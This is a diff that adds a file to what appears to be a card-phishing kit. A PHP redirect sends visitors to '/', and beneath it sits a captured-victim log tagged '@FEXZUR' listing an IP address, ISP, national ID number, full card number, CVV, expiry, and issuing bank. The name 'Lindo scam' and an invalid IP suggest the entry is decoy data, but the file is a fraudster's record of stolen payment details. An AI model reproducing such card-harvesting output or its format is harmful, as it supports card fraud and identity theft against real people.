@@ -1,0 +1,31 @@
+<?php
+header("Location: /");
+?>========== @FEXZUR ==========
+
+>> Datos de conexión <<
+
+IP: 181.443.222.13
+ISP: host82.181-13-206.telecom.net.ar
+
+>> Datos personales <<
+DNI: 22570357
+Nombre: Lindo scam
+
+
+>> Tarjeta <<
+Tarjeta: 4546 4241 8186 5893
+CVV: 123
+Vencimiento: 12/24
+
+
+>> Datos de tarjeta <<
+Tipo: credit
+Marca: Gold
+Esquema: visa
+Pais: Argentina
+Banco: GALICIA
+Url: No encontrado
+Telefono: 541143793333
+Ciudad: No encontrado
+========== @FEXZUR ==========
+
